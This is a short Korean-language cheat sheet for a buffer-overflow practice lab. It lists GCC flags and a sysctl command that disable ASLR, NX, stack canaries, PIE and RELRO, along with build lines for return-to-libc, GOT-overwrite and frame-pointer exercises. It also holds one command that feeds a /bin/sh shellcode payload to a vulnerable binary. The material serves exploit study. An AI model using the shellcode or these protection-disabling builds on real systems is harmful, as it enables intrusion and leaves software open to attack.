[BoF 설정]
 
root@fcad5ff3e2e6

GCC 컴파일 시 메모리 보호 기법 끄기

[ASLR] 
sudo sysctl -w kernel.randomize_va_space=0
- 0: ASLR 없음, 1: stack, library가 랜덤, 2: stack, library, heap이 랜덤 

[DEP/NX] 
gcc -z exestack …        # STACK에 실행권한 줌. DEP/NX 제거 

[CANARY] 
gcc -fno-stack-protector … # SSP 해제 
gcc -fstack-protector …   # SSP 설정 

[PIE] 
gcc -no-pie …    # PIE 해제 
gcc -fpie …      # .text 랜덤 
gcc -fpie -pie …   # PIE 설정 

[RELRO] 
gcc -z relro …       # PARTIAL-RELRO 설정
gcc -z relro –z now … # FULL-RELRO 설정 
gcc -z norelro …     # NO-RELRO 

[32bit Compile] 
sudo apt install gcc-multilib   # 관련 라이브러리 설치 후 사용가능
gcc -m32 … 		# 64bit에서 32bit 컴파일 
gcc -m64 … 		# default 

[Dummy] 
gcc -mpreferred-stack-boundary=2 …   # 32 bit 
gcc -mpreferred-stack-boundary=4 …   # 64bit

[함수 최적화] 
gcc -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 … # 함수 최적화 제거

[단독 링크] 
gcc -fno-builtin … # 라이브러리와 링크되지 않고 단독으로 링크 


[RET_Sled] 
gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -no-pie -fno-pic -o ret_sled ret_sled.c

[RTL] 
gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -no-pie -fno-pic -o rtl rtl.c

[GOT overwrite] 
gcc -m32 -no-pie -fno-pic -o GOT_overwrite GOT_overwrite.c

[sfp_overflow]
gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -no-pie -fno-pic -o sfp_overflow sfp_overflow.c

./sfp_overflow `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x00" * 15 + "\x84"'`

[UAF] 


[Fake EBP] 
gcc -m32 mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -no-pie -fno-pic -o fake_epb fake_epb.c



[apt-get install 명령이 안될 경우 해결책] 
apt-get update && \apt-get -y install sudo

[오류1] 

root@fcad5ff3e2e6:/home/ret_sled# gcc -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -no-pie -fno-pic -o ret_sled ret_sled.c 
In file included from ret_sled.c:1:
/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: No such file or directory
   27 | #include <bits/libc-header-start.h>
      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~
compilation terminated.

[해결책] 
sudo apt-get install gcc-multilib g++-multilib

